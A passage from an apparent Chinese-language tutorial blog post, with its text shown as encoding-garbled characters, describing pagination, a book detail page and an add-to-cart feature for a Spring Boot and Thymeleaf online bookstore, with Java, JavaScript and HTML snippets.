class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç„¶ååœ¨books_listï¼Œç±»ä¼¼é¦–é¡µå›¾ä¹¦å±•ç¤ºï¼Œåšä¸€ä¸ªåˆ†ç±»çš„å›¾ä¹¦å±•ç¤ºï¼Œè¯·æ±‚getBookListDataï¼Œç„¶ååœ¨getBookListDataä¸­åšå…·ä½“çš„å›¾ä¹¦å±•ç¤ºï¼Œbooklistå°±åšé™¤å›¾ä¹¦ä¿¡æ¯å¤–è¯¥é¡µå…¶ä»–å†…å®¹çš„å±•ç¤ºï¼ˆå¦‚è½®æ’­ï¼Œå¯¼èˆªæ ç­‰ï¼‰</p><p>categoryæ¥è‡ªmodel.addAttributeï¼Œå¹¶ç”¨é¡µæ•°ç­‰äº1ï¼Œpagesizeç­‰äºç©ºæ¥åˆå§‹åŒ–æŸ¥è¯¢ç¬¬ä¸€é¡µçš„æ•°æ®</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> category = [[$&#123;category&#125;]];</span><br><span class="line">$(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">   $(<span class="string">&quot;#bookList&quot;</span>).<span class="title function_">load</span>(contextPath + <span class="string">&quot;/book/getBookListData&quot;</span>,<span class="title function_">queryData</span>(<span class="number">1</span>,<span class="string">&#x27;&#x27;</span>,category))</span><br><span class="line">         &#125;)</span><br></pre></td></tr></table></figure><p>åŒ…è£…ä¸€ä¸‹queryDataå‚æ•°ï¼š</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">queryData</span>(<span class="params">page, pageSize, category</span>) &#123;</span><br><span class="line">   <span class="keyword">var</span> query = &#123;&#125;;</span><br><span class="line">   query.<span class="property">category</span> = category;</span><br><span class="line">   query.<span class="property">page</span> = page;<span class="comment">//å­˜å‚¨ç€å½“å‰é¡µæ•°</span></span><br><span class="line">   query.<span class="property">pageSize</span> =pageSize == <span class="string">&#x27;&#x27;</span> ? <span class="number">4</span> : pageSize;<span class="comment">//ä¸€é¡µæ˜¾ç¤ºå‡ ä¸ª</span></span><br><span class="line">   <span class="keyword">return</span> query;</span><br><span class="line">         &#125;</span><br></pre></td></tr></table></figure><p>å…·ä½“çš„åˆ†é¡µåŠŸèƒ½ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@RequestMapping(&quot;/getBookListData&quot;)</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">getBookListData</span><span class="params">(String category,Integer page, Integer pageSize, Model model)</span>&#123;</span><br><span class="line">    QueryWrapper&lt;Book&gt; queryWrapper = <span class="keyword">new</span> <span class="title class_">QueryWrapper</span>&lt;&gt;();</span><br><span class="line">    queryWrapper.eq(<span class="string">&quot;category&quot;</span>,category);</span><br><span class="line">    IPage&lt;Book&gt; iPage = bookService.page(<span class="keyword">new</span> <span class="title class_">Page</span>&lt;Book&gt;(page,pageSize),queryWrapper);</span><br><span class="line">    model.addAttribute(<span class="string">&quot;bookList&quot;</span>,iPage.getRecords());</span><br><span class="line">    model.addAttribute(<span class="string">&quot;pre&quot;</span>,iPage.getCurrent() - <span class="number">1</span>);</span><br><span class="line">    model.addAttribute(<span class="string">&quot;next&quot;</span>,iPage.getCurrent() + <span class="number">1</span>);</span><br><span class="line">    model.addAttribute(<span class="string">&quot;cur&quot;</span>,iPage.getCurrent());</span><br><span class="line">    model.addAttribute(<span class="string">&quot;pages&quot;</span>,iPage.getPages());</span><br><span class="line">    model.addAttribute(<span class="string">&quot;category&quot;</span>,category);</span><br><span class="line">    model.addAttribute(<span class="string">&quot;pageSize&quot;</span>,pageSize);</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;booksListData&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åç»­çš„å†…å®¹éƒ½å’Œé¦–é¡µå±•ç¤ºä¸€æ ·äº†ã€‚</p><p>é¦–é¡µï¼Œä¸Šä¸€é¡µï¼Œä¸‹ä¸€é¡µï¼Œå°¾é¡µéƒ½é€šè¿‡loadDataå®ç°ï¼Œæ¯”å¦‚é¦–é¡µï¼Œä¼ é€’ä¸Šå‚æ•°å°±okï¼ŒloadDataé€»è¾‘åœ¨ä¸»é¡µå†™è¿‡äº†ï¼Œè¿™é‡Œåªéœ€è¦å¤šåŠ ä¸€ä¸ªå‚æ•°ï¼Œä¹Ÿå°±æ˜¯é¡µç æ•°ï¼Œæ¥æ§åˆ¶ç¿»é¡µ</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">loadData</span>(<span class="number">1</span>,[[$&#123;category&#125;]])</span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">loadData</span>(<span class="params">page,pageSize,category</span>) &#123;</span><br><span class="line">    $(<span class="string">&quot;#bookList&quot;</span>).<span class="title function_">load</span>(contextPath + <span class="string">&quot;/book/getBookListData&quot;</span>,<span class="title function_">queryData</span>(page,pageSize,category))</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è·³è½¬åˆ°æŒ‡å®šé¡µï¼ŒåŒæ ·çš„ï¼Œè·å–åˆ°è¡¨å•è¾“å…¥çš„inputPageï¼Œä½œä¸ºå‚æ•°ä¼ é€’åˆ°getBookListDataï¼Œç„¶åç»è¿‡getBookListDataå¤„ç†åï¼Œä¼ é€’åˆ°å‰ç«¯getBookListData.htmlè¿›è¡Œå±•ç¤º</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">goPage</span>(<span class="params">pageSize,category</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> page = $(<span class="string">&quot;#inputPage&quot;</span>).<span class="title function_">val</span>();</span><br><span class="line">             $(<span class="string">&quot;#bookList&quot;</span>).<span class="title function_">load</span>(contextPath + <span class="string">&quot;/book/getBookListData&quot;</span>,<span class="title function_">queryData</span>(page,pageSize,category))</span><br><span class="line">         &#125;</span><br></pre></td></tr></table></figure><p>å‰ç«¯çš„ä¸Šä¸€é¡µæŒ‰é’®ï¼š</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">&quot;disabled&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;javascript:void(0)&quot;</span> <span class="attr">th:onclick</span>=<span class="string">&quot;loadData([[$&#123;pre&#125;]],[[$&#123;pageSize&#125;]],[[$&#123;category&#125;]])&quot;</span>&gt;</span><span class="symbol">&amp;laquo;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br></pre></td></tr></table></figure><p>ä¸‹ä¸€é¡µå°±æŠŠpreæ”¹ä¸ºnext</p><ul><li>è·³è½¬åˆ°æŸé¡µ</li></ul><p>æœç´¢æŒ‰é’®ï¼š</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">id</span>=<span class="string">&quot;inputPage&quot;</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">class</span>=<span class="string">&quot;form-control&quot;</span> <span class="attr">placeholder</span>=<span class="string">&quot;è·³è½¬æŒ‡å®šé¡µ&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">button</span> <span class="attr">class</span>=<span class="string">&quot;btn btn-info btn-search&quot;</span> <span class="attr">th:onclick</span>=<span class="string">&quot;goPage([[$&#123;pageSize&#125;]],[[$&#123;category&#125;]])&quot;</span>&gt;</span>GO<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br></pre></td></tr></table></figure><p>å¾ˆç®€å•ï¼Œè·å–åˆ°inputPageè¡¨å•æäº¤çš„è¦è·³è½¬åˆ°çš„é¡µåï¼Œç›´æ¥loadDataå¯¹åº”é¡µ</p><ul><li>æ§åˆ¶æ¯é¡µæ˜¾ç¤ºå‡ æ¡æ•°æ®</li></ul><p>åœ¨ç”¨selectåŠoptionå®ç°ä¸‹æ‹‰é€‰é¡¹çš„æ•ˆæœï¼Œå®šä¹‰value&#x3D;pagesizeï¼Œå®ç°å›ä¼ ï¼Œåœ¨optionå‘ç”Ÿå˜åŒ–æ—¶(onchange)è°ƒç”¨loadDataBysize(this)ã€‚</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">select</span> <span class="attr">id</span>=<span class="string">&quot;pageSize&quot;</span> <span class="attr">th:value</span>=<span class="string">&quot;$&#123;pageSize&#125;&quot;</span> <span class="attr">class</span>=<span class="string">&quot;form-control&quot;</span> <span class="attr">style</span>=<span class="string">&quot;width: 100px;display: inline;&quot;</span> <span class="attr">th:onchange</span>=<span class="string">&quot;|loadDataBySize(this)|&quot;</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&quot;2&quot;</span> <span class="attr">th:selected</span>=<span class="string">&quot;$&#123;pageSize == 2&#125;&quot;</span>&gt;</span>2<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&quot;4&quot;</span> <span class="attr">th:selected</span>=<span class="string">&quot;$&#123;pageSize == 4&#125;&quot;</span>&gt;</span>4<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br></pre></td></tr></table></figure><p>this.valueä¹Ÿå°±æ˜¯é€‰ä¸­çš„pagesizeï¼Œç„¶åè°ƒç”¨loadå®ç°é¡µé¢å±•ç¤º</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$(<span class="string">&quot;#bookList&quot;</span>).<span class="title function_">load</span>(contextPath + <span class="string">&quot;/book/getBookListData&quot;</span>,<span class="title function_">queryData</span>(<span class="number">1</span>,obj.<span class="property">value</span>,category))</span><br></pre></td></tr></table></figure><h2 id="å›¾ä¹¦è¯¦æƒ…é¡µå±•ç¤º"><a href="#å›¾ä¹¦è¯¦æƒ…é¡µå±•ç¤º" class="headerlink" title="å›¾ä¹¦è¯¦æƒ…é¡µå±•ç¤º"></a>å›¾ä¹¦è¯¦æƒ…é¡µå±•ç¤º</h2><p>è·³è½¬åˆ°å›¾ä¹¦è¯¦æƒ…é¡µï¼Œå¯ä»¥æœ‰ä¸¤ä¸ªä½ç½®ï¼š</p><p>ä¸€ä¸ªæ˜¯ç‚¹å‡»å›¾ç‰‡ï¼Œä¸€ä¸ªæ˜¯ç‚¹ä¸‹é¢çš„æ›´å¤šä¿¡æ¯</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230522165750775.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230522165750775.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>åœ¨imgæ ‡ç­¾å‰ååŠ ä¸Š&lt;a&gt;æ ‡ç­¾ï¼Œè¶…é“¾æ¥è·³è½¬è‡³<code>th:href=&quot;@&#123;/book/detail(id=$&#123;book.id&#125;)</code>å¸¦ä¸Šbook.idï¼Œå½“ä½œä¹¦çš„ä¸»é”®ï¼Œæ ¹æ®idåšè¯¦æƒ…é¡µçš„å±•ç¤º</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@RequestMapping(&quot;/detail&quot;)</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">getdetail</span><span class="params">(Integer id,Model model)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;details&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç„¶ååšå›¾ä¹¦ä¿¡æ¯çš„æŸ¥è¯¢ï¼ŒæŸ¥è¯¢å®Œæˆçš„å†…å®¹å†™å…¥modelã€‚è·Ÿå›¾ä¹¦å±•ç¤ºç±»ä¼¼ã€‚</p><blockquote><p>åªä¸è¿‡å›¾ä¹¦å±•ç¤ºæ˜¯ä»¥categoryåšåˆ†ç±»è¿›è¡ŒæŸ¥è¯¢çš„</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">queryWrapper.eq(<span class="string">&quot;category&quot;</span>,category);</span><br></pre></td></tr></table></figure><p>æ ¹æ®categoryï¼Œç”¨pageè¿›è¡Œåˆ†é¡µï¼Œåˆ†å®Œé¡µåœ¨ç”¨getRecords()æŠŠæ•°æ®å†™è¿›model</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">IPage&lt;Book&gt; iPage  = bookService.page(<span class="keyword">new</span> <span class="title class_">Page</span>&lt;&gt;(page,<span class="number">4</span>),queryWrapper);</span><br><span class="line">model.addAttribute(<span class="string">&quot;bookList&quot;</span>,iPage.getRecords());</span><br></pre></td></tr></table></figure></blockquote><p>è¿™é‡Œç”¨bookService.getById(id);è¿›è¡ŒæŸ¥è¯¢ï¼Œä¸ç”¨è¿›è¡Œåˆ†é¡µï¼Œèƒ½ç›´æ¥æŠŠæ•´ä¸ªæŸ¥è¯¢åˆ°çš„bookä¼ ç»™modelè¿›è¡Œå±•ç¤º</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Book</span> <span class="variable">book</span> <span class="operator">=</span> bookService.getById(id);</span><br><span class="line">model.addAttribute(<span class="string">&quot;book&quot;</span>,book);</span><br></pre></td></tr></table></figure><p>å‰ç«¯ç”¨themleafåšæ¸²æŸ“æ—¶ï¼Œå› ä¸ºpublishDateåœ¨æ•°æ®åº“ä¸­æ˜¯dateç±»å‹ï¼Œæ‰€ä»¥ç”¨dates.formatåšä¸‹æ ¼å¼åŒ–å¤„ç†</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">th:text=&quot;$&#123;#dates.format(book.publishDate,&#x27;yyyyå¹´MMæœˆ&#x27;)&#125;</span><br></pre></td></tr></table></figure><p>åœ¨è¯¦æƒ…é¡µçš„ä½ç½®ï¼Œæƒ³åœ¨è¿™é‡Œåšä¸€ä¸ªç›¸åŒåˆ†ç±»å›¾ä¹¦çš„æ¨è</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230522173323904.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230522173323904.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>ç”¨bootstrapæ¥å±…å³ï¼š</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;col-md-4 col-sm-3 col-xs-8&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><p>è¿™é‡Œå…ˆå†™ä¸Šé™æ€çš„ï¼Œæ—¶é—´ä¸å¤Ÿäº†ï¼ŒåæœŸæœ‰ç©ºå†æ¥æ”¹</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230522193941557.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230522193941557.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>å•†å“è¯¦æƒ…ç”¨äº†ä¸€ä¸ªæŠ˜å åŠŸèƒ½ï¼Œ<code>data-toggle=&quot;collapse&quot;</code>  å±æ€§æŒ‡å®šäº†è¶…é“¾æ¥çš„ä½œç”¨ï¼Œè¡¨ç¤ºè¿™ä¸ªé“¾æ¥å¯ä»¥å±•å¼€æˆ–æŠ˜å å†…å®¹ã€‚</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">data-toggle</span>=<span class="string">&quot;collapse&quot;</span> <span class="attr">data-parent</span>=<span class="string">&quot;#accordion&quot;</span> <span class="attr">href</span>=<span class="string">&quot;#collapseTwo&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230522193930590.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230522193930590.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>ä¹Ÿæ˜¯åªæ˜¯å†™äº†ä¸ªé™æ€ï¼ˆæ•°æ®è¡¨éƒ½è¿˜æ²¡å»ºã€‚ã€‚ï¼‰</p><h2 id="è´­ç‰©è½¦"><a href="#è´­ç‰©è½¦" class="headerlink" title="è´­ç‰©è½¦"></a>è´­ç‰©è½¦</h2><h3 id="åŠ å…¥è´­ç‰©è½¦åŠŸèƒ½"><a href="#åŠ å…¥è´­ç‰©è½¦åŠŸèƒ½" class="headerlink" title="åŠ å…¥è´­ç‰©è½¦åŠŸèƒ½"></a>åŠ å…¥è´­ç‰©è½¦åŠŸèƒ½</h3><p>ç‚¹å‡»åŠ å…¥è´­ç‰©è½¦ï¼Œæ‰§è¡ŒaddCartå‡½æ•°ï¼Œåªéœ€è¦ä¼ é€’ä¸»é”®id</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;javascript:void(0)&quot;</span> <span class="attr">th:onclick</span>=<span class="string">&quot;addCart([[$&#123;book.id&#125;]])&quot;</span> <span class="attr">class</span>=<span class="string">&quot;btn btn-default&quot;</span> <span class="attr">role</span>=<span class="string">&quot;button&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><p>é¦–å…ˆï¼Œéœ€è¦åˆ¤æ–­ç”¨æˆ·åæ˜¯å¦ä¸ºç©ºï¼Œæ²¡ç™»å½•å½“ç„¶ä¸èƒ½æ·»åŠ åˆ°è´­ç‰©è½¦ï¼ˆsession)ã€‚è´­ä¹°æ•°é‡ä¹Ÿä¸èƒ½ä¸ºç©º</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> user = [[$&#123;session.<span class="property">user</span>&#125;]];</span><br><span class="line"><span class="keyword">var</span> bookNum = $(<span class="string">&quot;#bookCount&quot;</span>).<span class="title function_">val</span>();</span><br><span class="line">   <span class="keyword">if</span>(bookNum == <span class="string">&#x27;&#x27;</span> || bookNum == <span class="string">&#x27;undefined&#x27;</span>)&#123;</span><br><span class="line">       <span class="title function_">alert</span>(<span class="string">&quot;è¯·è¾“å…¥è´­ä¹°æ•°é‡ï¼&quot;</span>);</span><br><span class="line">       <span class="keyword">return</span>;</span><br><span class="line">   &#125;</span><br><span class="line"><span class="keyword">if</span>(user == <span class="string">&#x27;&#x27;</span> || user == <span class="literal">null</span>)&#123;</span><br><span class="line">       <span class="title function_">alert</span>(<span class="string">&quot;è¯·å…ˆç™»å½•ï¼&quot;</span>);</span><br><span class="line">       <span class="keyword">return</span>;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨ajaxåŠ å…¥è´­ç‰©è½¦ï¼ŒæŠŠæ¥æ”¶åˆ°çš„bookidå’Œè´­ä¹°æ•°é‡count postç»™&#x2F;cart&#x2F;addæ˜ å°„</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">$.<span class="title function_">ajax</span>(&#123;</span><br><span class="line">      <span class="attr">url</span>: contextPath + <span class="string">&quot;/cart/add&quot;</span>,</span><br><span class="line">      <span class="attr">data</span>:&#123;<span class="string">&#x27;count&#x27;</span> : bookNum,<span class="string">&#x27;bookId&#x27;</span> : bookId&#125;,</span><br><span class="line">      <span class="attr">method</span>:<span class="string">&quot;post&quot;</span>,</span><br><span class="line">      <span class="attr">success</span>:<span class="keyword">function</span> (<span class="params">data</span>) &#123;</span><br><span class="line">         <span class="keyword">if</span>(data == <span class="string">&#x27;success&#x27;</span>)&#123;</span><br><span class="line">             <span class="comment">//è·³è½¬åˆ°è´­ç‰©è½¦åˆ—è¡¨</span></span><br><span class="line">            <span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">href</span> = contextPath + <span class="string">&quot;/cart/list&quot;</span>;</span><br><span class="line">         &#125;</span><br><span class="line">                 &#125;</span><br><span class="line">   &#125;)</span><br></pre></td></tr></table></figure><p>å®Œæ•´çš„ä»£ç ï¼š</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> user = [[$&#123;session.<span class="property">user</span>&#125;]];</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">addCart</span>(<span class="params">bookId</span>) &#123;</span><br><span class="line">   <span class="comment">//éªŒè¯è´­ä¹°å›¾ä¹¦æ•°é‡</span></span><br><span class="line">   <span class="keyword">var</span> bookNum = $(<span class="string">&quot;#bookCount&quot;</span>).<span class="title function_">val</span>();</span><br><span class="line">   <span class="keyword">if</span>(bookNum == <span class="string">&#x27;&#x27;</span> || bookNum == <span class="string">&#x27;undefined&#x27;</span>)&#123;</span><br><span class="line">       <span class="title function_">alert</span>(<span class="string">&quot;è¯·è¾“å…¥è´­ä¹°æ•°é‡ï¼&quot;</span>);</span><br><span class="line">       <span class="keyword">return</span>;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="comment">//éªŒè¯ç”¨æˆ·æ˜¯å¦å·²ç»ç™»å½•</span></span><br><span class="line">   <span class="keyword">if</span>(user == <span class="string">&#x27;&#x27;</span> || user == <span class="literal">null</span>)&#123;</span><br><span class="line">       <span class="title function_">alert</span>(<span class="string">&quot;è¯·å…ˆç™»å½•ï¼&quot;</span>);</span><br><span class="line">       <span class="keyword">return</span>;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="comment">//åŠ å…¥è´­ç‰©è½¦</span></span><br><span class="line">   $.<span class="title function_">ajax</span>(&#123;</span><br><span class="line">      <span class="attr">url</span>: contextPath + <span class="string">&quot;/cart/add&quot;</span>,</span><br><span class="line">      <span class="attr">data</span>:&#123;<span class="string">&#x27;count&#x27;</span> : bookNum,<span class="string">&#x27;bookId&#x27;</span> : bookId&#125;,</span><br><span class="line">      <span class="attr">method</span>:<span class="string">&quot;post&quot;</span>,</span><br><span class="line">      <span class="attr">success</span>:<span class="keyword">function</span> (<span class="params">data</span>) &#123;</span><br><span class="line">         <span class="keyword">if</span>(data == <span class="string">&#x27;success&#x27;</span>)&#123;</span><br><span class="line">             <span class="comment">//è·³è½¬åˆ°è´­ç‰©è½¦åˆ—è¡¨</span></span><br><span class="line">            <span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">href</span> = contextPath + <span class="string">&quot;/cart/list&quot;</span>;</span><br><span class="line">         &#125;</span><br><span class="line">                 &#125;</span><br><span class="line">   &#125;)</span><br><span class="line">         &#125;</span><br></pre></td></tr></table></figure><p>åç«¯ï¼Œenumsä¸‹å»ºCartçš„å®ä½“ç±»ï¼ŒåŠ @Dataï¼Œ@TableNameï¼Œå»ºCartMapperï¼Œå»ºCartServiceä¸èµ˜è¿°äº†</p><p>æ³¨æ„è¿™é‡Œå®šä¹‰å®ä½“ç±»çš„åå­—å’Œajax postçš„jsonæ•°æ®çš„keyå¯¹åº”ä¸€ä¸‹ï¼Œè¿™æ ·åœ¨CartControllerå°±èƒ½ç›´æ¥ç”¨Cartæ¥æ¥æ”¶å‚æ•°äº†</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> Integer bookid;</span><br><span class="line"><span class="keyword">private</span> Integer count;</span><br></pre></td></tr></table></figure><p>CartControllerç›´æ¥ç”¨Cartæ¥æ¥æ”¶bookidå’Œcountå‚æ•°ï¼Œä»sessionä¸­å–useridç„¶åå­˜è¿›cartæ•°æ®åº“</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> String <span class="title function_">addCart</span><span class="params">(Cart cartï¼ŒHttpSession session)</span>&#123;</span><br><span class="line">    <span class="type">User</span> <span class="variable">user</span> <span class="operator">=</span> (User) session.getAttribute(<span class="string">&quot;user&quot;</span>);</span><br><span class="line">        cart.setUserid(user.getId());</span><br><span class="line">    cartService.save(cart);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;success&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™æ ·å››ä¸ªå­—æ®µéƒ½ä¸bs_cartæ•°æ®è¡¨å¯¹åº”ä¸Šäº†ï¼š</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230522184040441.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230522184040441.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><blockquote><ul><li>æ³¨æ„ï¼šaddCartæ–¹æ³•éœ€è¦ç”¨ResponseBodyè¿›è¡Œæ³¨è§£ï¼ŒæŠŠè¿”å›å†…å®¹ç›´æ¥å†™å…¥åˆ°HTTP response</li></ul><p><code>@ResponseBody</code>  æ³¨è§£ç”¨äºæ§åˆ¶å™¨æ–¹æ³•ä¸Šï¼Œè¡¨ç¤ºè¯¥æ–¹æ³•è¿”å›çš„æ˜¯å“åº”ä½“ï¼ˆResponseBodyï¼‰ï¼Œè€Œä¸æ˜¯è§†å›¾åã€‚</p><p>é€šå¸¸æƒ…å†µä¸‹ï¼Œæ§åˆ¶å™¨æ–¹æ³•è¿”å›çš„æ˜¯è§†å›¾åï¼Œç„¶åæ¡†æ¶ä¼šä½¿ç”¨è¯¥è§†å›¾åå»åŒ¹é…è§†å›¾å¹¶æ¸²æŸ“ï¼Œæœ€ç»ˆè¿”å›å“åº”ã€‚  </p><p> ä½¿ç”¨  <code>@ResponseBody</code>  æ³¨è§£åï¼Œæ–¹æ³•è¿”å›çš„å†…å®¹å°†ç›´æ¥å†™å…¥åˆ° HTTP å“åº”ä½“ä¸­ï¼Œè€Œä¸æ˜¯å†™å…¥åˆ°æ¨¡å‹å’Œè§†å›¾ä¸­ã€‚ </p></blockquote><ul><li>æµ‹è¯•æ˜¯å¦å†™å…¥æ•°æ®è¡¨bs_cartï¼š</li></ul><p>æœªç™»å½•æ—¶ä¼šæç¤ºå…ˆç™»å½•ï¼š</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230522190110327.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230522190110327.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>ç”¨godownä¹°çš„ï¼Œuser_id&#x3D;6ï¼š</p><p><img 